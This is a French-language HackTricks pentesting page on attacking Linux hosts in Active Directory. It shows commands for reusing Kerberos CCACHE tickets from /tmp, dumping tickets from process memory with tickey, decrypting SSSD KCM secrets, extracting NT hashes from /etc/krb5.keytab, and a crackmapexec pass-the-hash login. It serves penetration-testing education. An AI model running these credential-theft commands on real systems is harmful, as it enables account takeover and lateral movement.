# Linux Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Vous voulez voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord**](https://discord.gg/hRep4RUj7f) ou le **groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Une machine Linux peut également être présente dans un environnement Active Directory.

Une machine Linux dans un AD pourrait **stocker différents tickets CCACHE dans des fichiers. Ces tickets peuvent être utilisés et exploités comme tout autre ticket Kerberos**. Pour lire ces tickets, vous devrez être le propriétaire utilisateur du ticket ou **root** dans la machine.

## Énumération

### Énumération AD depuis Linux

Si vous avez accès à un AD sous Linux (ou bash sous Windows), vous pouvez essayer [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) pour énumérer l'AD.

Vous pouvez également consulter la page suivante pour apprendre **d'autres façons d'énumérer l'AD depuis Linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA est une **alternative** open-source à Microsoft Windows **Active Directory**, principalement pour les environnements **Unix**. Il combine un **annuaire LDAP complet** avec un centre de distribution de clés MIT **Kerberos** pour la gestion similaire à Active Directory. En utilisant le système de certificats Dogtag pour la gestion des certificats CA & RA, il prend en charge l'authentification **multi-facteurs**, y compris les cartes à puce. SSSD est intégré pour les processus d'authentification Unix. En savoir plus à ce sujet dans :

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Manipulation des tickets

### Pass The Ticket

Sur cette page, vous allez trouver différents endroits où vous pourriez **trouver des tickets Kerberos à l'intérieur d'un hôte Linux**, dans la page suivante, vous pouvez apprendre comment transformer ces formats de tickets CCache en Kirbi (le format dont vous avez besoin pour utiliser dans Windows) et aussi comment effectuer une attaque PTT :

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Réutilisation de tickets CCACHE depuis /tmp

Les fichiers CCACHE sont des formats binaires pour **stocker les informations d'identification Kerberos** sont généralement stockés avec des autorisations 600 dans `/tmp`. Ces fichiers peuvent être identifiés par leur **format de nom, `krb5cc_%{uid}`,** correspondant à l'UID de l'utilisateur. Pour la vérification du ticket d'authentification, la **variable d'environnement `KRB5CCNAME`** doit être définie sur le chemin du fichier de ticket souhaité, permettant sa réutilisation.

Listez le ticket actuel utilisé pour l'authentification avec `env | grep KRB5CCNAME`. Le format est portable et le ticket peut être **réutilisé en définissant la variable d'environnement** avec `export KRB5CCNAME=/tmp/ticket.ccache`. Le format du nom du ticket Kerberos est `krb5cc_%{uid}` où uid est l'UID de l'utilisateur.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Réutilisation de ticket CCACHE à partir du trousseau de clés

**Les tickets Kerberos stockés dans la mémoire d'un processus peuvent être extraits**, en particulier lorsque la protection ptrace de la machine est désactivée (`/proc/sys/kernel/yama/ptrace_scope`). Un outil utile à cette fin se trouve sur [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), qui facilite l'extraction en injectant dans les sessions et en extrayant les tickets dans `/tmp`.

Pour configurer et utiliser cet outil, les étapes ci-dessous sont suivies :
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Cette procédure tentera d'injecter dans diverses sessions, indiquant le succès en stockant les tickets extraits dans `/tmp` avec une convention de nommage `__krb_UID.ccache`.


### Réutilisation de ticket CCACHE à partir de SSSD KCM

SSSD maintient une copie de la base de données au chemin `/var/lib/sss/secrets/secrets.ldb`. La clé correspondante est stockée en tant que fichier caché au chemin `/var/lib/sss/secrets/.secrets.mkey`. Par défaut, la clé n'est lisible que si vous avez les permissions **root**.

L'invocation de **`SSSDKCMExtractor`** avec les paramètres --database et --key analysera la base de données et **déchiffrera les secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Le **blob de cache d'informations d'identification Kerberos peut être converti en un fichier CCache Kerberos utilisable** qui peut être transmis à Mimikatz/Rubeus.

### Réutilisation de ticket CCACHE à partir de keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extraire des comptes depuis /etc/krb5.keytab

Les clés de compte de service, essentielles pour les services fonctionnant avec des privilèges root, sont stockées de manière sécurisée dans les fichiers **`/etc/krb5.keytab`**. Ces clés, semblables à des mots de passe pour les services, exigent une confidentialité stricte.

Pour inspecter le contenu du fichier keytab, **`klist`** peut être utilisé. Cet outil est conçu pour afficher les détails de la clé, y compris le **NT Hash** pour l'authentification de l'utilisateur, en particulier lorsque le type de clé est identifié comme étant 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Pour les utilisateurs de Linux, **`KeyTabExtract`** offre une fonctionnalité pour extraire le hachage RC4 HMAC, qui peut être exploité pour réutiliser le hachage NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Sur macOS, **`bifrost`** sert d'outil d'analyse de fichiers keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
En utilisant les informations de compte et de hachage extraites, des connexions aux serveurs peuvent être établies en utilisant des outils tels que **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Références
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou souhaitez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
